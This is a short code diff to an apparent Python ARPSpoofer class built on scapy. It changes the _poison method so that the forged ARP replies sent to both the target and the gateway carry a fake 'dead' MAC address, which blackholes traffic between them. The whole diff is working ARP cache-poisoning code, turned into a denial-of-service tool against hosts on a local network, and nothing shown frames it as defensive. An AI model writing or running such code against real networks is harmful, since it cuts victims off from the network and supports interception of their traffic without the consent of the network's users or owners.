@@ -86,10 +86,12 @@ class ARPSpoofer:
     # ── ARP ───────────────────────────────────────────────────────────────────
 
     def _poison(self, target_ip, target_mac, gateway_ip, gateway_mac):
+        # Dead MAC: traffic vanishes at the switch, never reaches our machine
+        _dead = "de:ad:be:ef:de:ad"
         try:
             sendp([
-                Ether(dst=target_mac)  / ARP(op=2, pdst=target_ip,  hwdst=target_mac,  psrc=gateway_ip),
-                Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip),
+                Ether(dst=target_mac)  / ARP(op=2, pdst=target_ip,  hwdst=target_mac,  psrc=gateway_ip, hwsrc=_dead),
+                Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip,  hwsrc=_dead),
             ], iface=self._iface, verbose=0)
         except Exception as e:
             print(f"[spoofer] poison error: {e}")
